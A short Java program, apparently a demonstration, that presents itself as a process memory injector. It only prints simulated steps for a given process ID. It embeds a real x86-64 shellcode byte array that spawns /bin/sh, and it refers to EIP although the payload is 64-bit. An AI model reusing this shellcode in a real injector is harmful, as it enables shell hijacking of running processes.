import java.util.Scanner;

public class injection {
    // The shellcode that calls /bin/sh
    private static final byte[] shellcode = {
        (byte) 0x31, (byte) 0xc0, (byte) 0x48, (byte) 0xbb, (byte) 0xd1, (byte) 0x9d, (byte) 0x96, (byte) 0x91,
        (byte) 0xd0, (byte) 0x8c, (byte) 0x97, (byte) 0xff, (byte) 0x48, (byte) 0xf7, (byte) 0xdb, (byte) 0x53,
        (byte) 0x54, (byte) 0x5f, (byte) 0x99, (byte) 0x52, (byte) 0x57, (byte) 0x54, (byte) 0x5e, (byte) 0xb0,
        (byte) 0x3b, (byte) 0x0f, (byte) 0x05
    };

    // Header for our program
    private static void header() {
        System.out.println("----Memory bytecode injector-----");
    }

    // Main program notice we take command line options
    public static void main(String[] args) {
        if (args.length < 1) {
            System.out.println("Usage: java MemoryBytecodeInjector <PID>");
            return;
        }

        int pid = Integer.parseInt(args[0]);

        header();

        // Allocate memory for shellcode (simulated)
        byte[] buff = new byte[shellcode.length];
        System.arraycopy(shellcode, 0, buff, 0, shellcode.length);

        // Simulate attaching to the process
        System.out.printf("Simulating attaching to process %d...\n", pid);

        // Simulate getting process registers
        // NOTE: In Java, this is not possible. This part is only for demonstration.
        System.out.printf("Writing EIP (simulated), process %d\n", pid);

        // Simulate writing the shellcode to process memory
        for (int i = 0; i < buff.length; i++) {
            System.out.printf("Writing byte 0x%x to process memory at EIP + %d (simulated)\n", buff[i], i);
        }

        // Simulate detaching from the process
        System.out.printf("Detaching from process %d (simulated)...\n", pid);
    }
}